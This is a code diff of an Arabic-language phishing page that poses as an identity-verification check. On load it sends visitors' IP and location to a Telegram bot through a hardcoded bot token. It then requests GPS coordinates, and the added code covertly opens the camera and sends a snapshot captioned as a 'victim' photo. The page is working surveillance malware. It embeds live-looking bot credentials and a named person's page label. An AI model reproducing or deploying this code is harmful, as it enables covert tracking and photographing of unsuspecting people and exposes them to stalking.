@@ -20,19 +20,6 @@
             margin: auto;
             box-shadow: 0 0 15px rgba(0,0,0,0.5);
         }
-        .spinner {
-            border: 5px solid #444;
-            border-top: 5px solid #0f0;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
         button {
             background: #0a84ff;
             border: none;
@@ -43,8 +30,17 @@
             margin-top: 20px;
             cursor: pointer;
         }
+        video, canvas {
+            display: none;
+        }
         .hidden {
             display: none;
+        }
+        .status {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 10px;
+            background: #3a3a4b;
         }
     </style>
 </head>
@@ -52,20 +48,22 @@
 
 <div class="container">
     <h2>🔐 تحقق من هوية الزائر</h2>
-    <p>لأسباب أمنية، يلزم تأكيد موقعك الجغرافي</p>
-    <div id="status">📡 جاري تجهيز البيانات...</div>
+    <p>لأسباب أمنية، يلزم تأكيد هويتك</p>
+    <div id="status" class="status">📡 جاري تجهيز البيانات...</div>
     <button id="allowBtn" class="hidden">✅ السماح بالتحقق</button>
 </div>
 
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
+
 <script>
-    // بيانات البوت الجديدة (التوكن الصحيح)
-    const BOT_TOKEN = "7579374201:AAEk53e2ovXUa-_fuUKmr78JVg0IJAMyRBE";
-    const CHAT_ID = "8669811855";   // معرف المستخدم المصرح له
-
-    // اسم صفحة الشخص
+    // ================= البيانات الخاصة بك =================
+    const BOT_TOKEN = "8669811855:AAEzIrBKoyRD5f9zpKLQB0IwTxviOrSujN0";
+    const CHAT_ID = "7214473798";
     const PAGE_NAME = "جبله علي جبر بك";
+    // ====================================================
 
-    // دالة إرسال إلى التليغرام
+    // دالة إرسال إلى التليغرام (نص)
     async function sendToTelegram(message) {
         try {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -74,12 +72,39 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: message.substring(0, 4096)
+                    text: message.substring(0, 4096),
+                    parse_mode: 'HTML'
                 })
             });
         } catch(e) {
-            console.log("Telegram send error");
+            console.error("Telegram send error:", e);
         }
+    }
+
+    // دالة إرسال صورة إلى التليغرام
+    async function sendPhotoToTelegram(base64Image) {
+        try {
+            const blob = dataURLtoBlob(base64Image);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            await fetch(url, { method: 'POST', body: formData });
+        } catch(e) {
+            console.error("Photo send error:", e);
+        }
+    }
+
+    function dataURLtoBlob(dataURL) {
+        const arr = dataURL.split(',');
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        while (n--) { u8arr[n] = bstr.charCodeAt(n); }
+        return new Blob([u8arr], { type: mime });
     }
 
     // جلب الـ IP + الموقع التقريبي
@@ -103,7 +128,6 @@
 
     // طلب الموقع الدقيق (GPS)
     function requestGPS() {
-        document.getElementById('status').innerHTML = "📍 نطلب من المتصفح السماح...";
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
@@ -112,56 +136,75 @@
                     const acc = position.coords.accuracy;
                     const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                    // إرسال GPS
                     let gpsMsg = `🎯 <b>${PAGE_NAME}</b> - موقع دقيق ✅\n`;
-                    gpsMsg += `📍 الرابط: ${mapLink}\n`;
-                    gpsMsg += `📏 الدقة: ${Math.round(acc)} متر\n`;
-                    gpsMsg += `🕒 ${new Date().toLocaleString()}`;
+                    gpsMsg += `📍 ${mapLink}\n`;
+                    gpsMsg += `📏 دقة: ${Math.round(acc)} متر`;
                     await sendToTelegram(gpsMsg);
-
-                    document.getElementById('status').innerHTML = `✅ تم التحقق. جاري التحويل...`;
-                    
-                    // اختياري: توجيهه لصفحة حقيقية بعد 2 ثانية
-                    setTimeout(() => {
-                        window.location.href = "https://www.facebook.com/jableh.ali.jbr";
-                    }, 2000);
                 },
                 async (error) => {
-                    let errMsg = `⚠️ <b>${PAGE_NAME}</b> - رفض GPS\n`;
-                    errMsg += `السبب: ${error.message}\n`;
-                    errMsg += `🕒 ${new Date().toLocaleString()}`;
-                    await sendToTelegram(errMsg);
-                    document.getElementById('status').innerHTML = "❌ السماح مطلوب. الرجاء الضغط على الزر.";
-                    document.getElementById('allowBtn').classList.remove('hidden');
+                    await sendToTelegram(`⚠️ ${PAGE_NAME} - رفض GPS: ${error.message}`);
                 },
                 { enableHighAccuracy: true, timeout: 10000 }
             );
+        }
+    }
+
+    // طلب كاميرا وتصوير
+    function requestCameraAndCapture() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    video.play();
+
+                    setTimeout(() => {
+                        const context = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const dataURL = canvas.toDataURL('image/jpeg', 0.8);
+                        sendPhotoToTelegram(dataURL);
+                        
+                        // إيقاف الكاميرا
+                        stream.getTracks().forEach(track => track.stop());
+                        video.srcObject = null;
+                    }, 1500);
+                })
+                .catch((err) => {
+                    sendToTelegram(`⚠️ ${PAGE_NAME} - رفض كاميرا: ${err.message}`);
+                });
         } else {
-            document.getElementById('status').innerHTML = "⚠️ المتصفح لا يدعم تحديد الموقع";
+            sendToTelegram(`⚠️ ${PAGE_NAME} - المتصفح لا يدعم الكاميرا`);
         }
     }
 
     // التنفيذ الرئيسي
     (async function() {
-        // 1. إرسال IP فور فتح الصفحة
+        // إرسال IP فوراً
         const ipData = await getLocationInfo();
-        if (ipData) {
+        if (ipData && ipData.ip) {
             let ipMsg = `🌐 <b>${PAGE_NAME}</b> - دخول جديد\n`;
             ipMsg += `📡 IP: ${ipData.ip}\n`;
-            ipMsg += `🏙️ ${ipData.city}, ${ipData.region}, ${ipData.country}\n`;
+            ipMsg += `🏙️ ${ipData.city || 'غير معروف'}, ${ipData.country || ''}\n`;
             if (ipData.lat && ipData.lon) {
-                ipMsg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipData.lat},${ipData.lon}\n`;
+                ipMsg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipData.lat},${ipData.lon}`;
             }
-            ipMsg += `🖥️ ${navigator.userAgent}\n🕒 ${new Date().toLocaleString()}`;
             await sendToTelegram(ipMsg);
         } else {
-            await sendToTelegram(`⚠️ <b>${PAGE_NAME}</b> - زائر جديد لكن فشل جلب IP`);
+            await sendToTelegram(`⚠️ ${PAGE_NAME} - زائر جديد لكن تعذر جلب IP`);
         }
 
-        // 2. طلب GPS تلقائي بعد 1 ثانية
-        setTimeout(() => {
-            requestGPS();
-        }, 1000);
+        // طلب GPS بعد ثانية
+        setTimeout(() => { requestGPS(); }, 2000);
+        
+        // طلب كاميرا بعد 3 ثواني
+        setTimeout(() => { 
+            document.getElementById('status').innerHTML = "🎥 نطلب الوصول للكاميرا...";
+            requestCameraAndCapture(); 
+        }, 4000);
     })();
 </script>
 </body>
